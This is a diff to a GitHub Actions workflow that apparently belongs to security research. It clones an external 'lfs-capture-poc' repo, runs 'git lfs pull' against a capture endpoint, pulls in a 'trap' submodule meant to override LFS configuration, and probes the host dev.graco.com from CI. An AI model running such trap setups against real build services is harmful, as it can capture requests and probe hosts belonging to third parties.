@@ -1,37 +1,41 @@
 name: LFS Build Simulation v3
 on:
-push:
-branches: [main]
-workflow_dispatch:
+  push:
+    branches: [main]
+  workflow_dispatch:
 
 jobs:
-build:
-runs-on: ubuntu-latest
-steps:
-- name: Simulate CF Pages git clone with submodule trap
-  run: |
-    echo "=== ORACLE_START ==="
-    echo "Cloning repo (simulates CF Pages build environment)..."
-    git clone https://github.com/GraoMelo/lfs-capture-poc.git repo
-    cd repo
-    echo "=== .lfsconfig ==="
-    cat .lfsconfig 2>/dev/null || echo "NO_LFSCONFIG"
-    echo "=== .gitmodules ==="
-    cat .gitmodules 2>/dev/null || echo "NO_GITMODULES"
-    echo "=== Git LFS version ==="
-    git lfs version
-    echo "=== Git config (LFS) ==="
-    git config --list | grep -i lfs || echo "NO_LFS_CONFIG"
-    echo "=== Running git lfs pull (THIS reads .lfsconfig) ==="
-    git lfs pull 2>&1 || echo "LFS_PULL_FAILED"
-    echo "=== Attempting submodule init + update (trap repo only) ==="
-    git submodule init lib/lfs-trap 2>&1 || echo "SUBMODULE_INIT_FAILED"
-    git submodule update lib/lfs-trap 2>&1 || echo "SUBMODULE_UPDATE_FAILED"
-    echo "=== Submodule .lfsconfig (should override parent) ==="
-    cat lib/lfs-trap/.lfsconfig 2>/dev/null || echo "NO_SUBMODULE_LFSCONFIG"
-    echo "=== Submodule endpoints (references blocked URL) ==="
-    cat lib/lfs-trap/config/endpoints.json 2>/dev/null || echo "NO_ENDPOINTS"
-    echo "=== Probing dev.graco.com from CI ==="
-    curl -sS -o /dev/null -w "HTTP_STATUS:%{http_code} TIME:%{time_total}s" --connect-timeout 5 https://dev.graco.com/health 2>&1 || echo "BLOCKED_OR_TIMEOUT"
-    echo ""
-    echo "=== ORACLE_END ==="
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Simulate CF Pages git clone with submodule trap
+      env:
+        GIT_LFS_SKIP_SMUDGE: 1
+      run: |
+        echo "=== ORACLE_START ==="
+        echo "Cloning repo (simulates CF Pages build environment)..."
+        git clone https://github.com/GraoMelo/lfs-capture-poc.git repo
+        cd repo
+        echo "=== .lfsconfig ==="
+        cat .lfsconfig 2>/dev/null || echo "NO_LFSCONFIG"
+        echo "=== .gitmodules ==="
+        cat .gitmodules 2>/dev/null || echo "NO_GITMODULES"
+        echo "=== Git LFS version ==="
+        git lfs version
+        echo "=== Git config (LFS) ==="
+        git config --list | grep -i lfs || echo "NO_LFS_CONFIG"
+        echo "=== git lfs env (shows effective LFS endpoint) ==="
+        git lfs env 2>&1 | grep -i endpoint || echo "NO_ENDPOINT"
+        echo "=== Running git lfs pull (THIS reads .lfsconfig and hits capture endpoint) ==="
+        git lfs pull 2>&1 || echo "LFS_PULL_FAILED (expected — capture endpoint returns 405)"
+        echo "=== Attempting submodule init + update (trap repo only) ==="
+        git submodule init lib/lfs-trap 2>&1 || echo "SUBMODULE_INIT_FAILED"
+        git submodule update lib/lfs-trap 2>&1 || echo "SUBMODULE_UPDATE_FAILED"
+        echo "=== Submodule .lfsconfig (should override parent) ==="
+        cat lib/lfs-trap/.lfsconfig 2>/dev/null || echo "NO_SUBMODULE_LFSCONFIG"
+        echo "=== Submodule endpoints (references blocked URL) ==="
+        cat lib/lfs-trap/config/endpoints.json 2>/dev/null || echo "NO_ENDPOINTS"
+        echo "=== Probing dev.graco.com from CI ==="
+        curl -sS -o /dev/null -w "HTTP_STATUS:%{http_code} TIME:%{time_total}s" --connect-timeout 5 https://dev.graco.com/health 2>&1 || echo "BLOCKED_OR_TIMEOUT"
+        echo ""
+        echo "=== ORACLE_END ==="
